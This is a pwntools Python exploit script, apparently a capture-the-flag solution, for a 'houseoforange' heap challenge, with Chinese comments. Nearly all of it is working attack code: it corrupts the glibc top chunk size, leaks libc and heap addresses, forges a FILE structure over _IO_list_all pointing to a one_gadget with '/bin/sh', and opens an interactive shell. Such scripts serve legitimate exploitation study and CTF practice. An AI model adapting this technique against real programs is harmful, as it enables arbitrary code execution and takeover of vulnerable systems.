#!/usr/bin/env python
# coding=utf-8
from pwn import *
debug = 0
a=process("./houseoforange")
if debug:
    gdb.attach(a,'''
    b *0x555555554000+0xdaa

    ''')

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF("./houseoforange")
def menu(choice):
    a.recvuntil(': ')
    a.sendline(str(choice))
def build(length, name, price, color):
    menu(1)
    a.recvuntil(":")
    a.sendline(str(length))
    a.recvuntil(":")
    a.send(name)
    a.recvuntil(":")
    a.sendline(str(price))
    a.recvuntil(":")
    a.sendline(str(color))
def see():
    menu(2)
def upgrade(length, name, price, color):
    menu(3)
    a.recvuntil(":")
    a.sendline(str(length))
    a.recvuntil(":")
    a.send(name)
    a.recvuntil(":")
    a.sendline(str(price))
    a.recvuntil(":")
    a.sendline(str(color))
log.info("house of orange ...")
build(0x10,'a',1,1) #第一个次 build
payload='A'*0x10      #填充name chunk
payload+=p64(0)    # color chunk prevsize
payload+=p64(0x21)  # color chunk size
payload+='A'*16     # padding
payload+=p64(0)+p64(0xfa0) # 篡改 top chunk size
upgrade(len(payload),payload,1,1) 
build(0x1000,'a',1,1)# malloc 一个大chunk，top chunk free进 unsorted bin

log.info("leak libc and heap address")
build(0x400,'A'*8,1,1)#malloc 一个large chunk，用来泄露libc和heap address
see()
a.recvuntil("A"*8)
libc_base=u64(a.recv(6).ljust(8,"\x00"))-1640 -libc.symbols["__malloc_hook"]-0x10 #leak 出libc
success("libc_base ==>0x%x"%libc_base)
one_gadget = libc_base + 0x45216
#one_gadget=libc_base+0x45216
success("one_gadget ==> 0x%x"%one_gadget)
io_list_all = libc_base + libc.symbols["_IO_list_all"]
success("io_list_all ==> 0x%x"%io_list_all)
payload='A'*16 
upgrade(len(payload),payload,1,1)
see() #leak heap address
a.recvuntil("A"*16)
heap_addr=u64(a.recv(6).ljust(8,"\x00")) + 0x10 #指向 name chunk 的 user data
success("heap_address ==> 0x%x"%heap_addr)

payload='A'*0x400
payload+=p64(0)+p64(0x21)
payload+='A'*16

payload+="/bin/sh\x00"
payload+=p64(0x61)
payload+=p64(0)+p64(io_list_all-0x10)
payload+=p64(0)+p64(1) # by pass write_ptr > write_base
payload+='\x00'*(0xd8-48)
payload+=p64(heap_addr+0x420+0xd8+8)
payload+=p64(0)*3
payload+=p64(one_gadget)
upgrade(len(payload),payload,1,1)
a.recv()
a.sendline("1")
a.interactive()





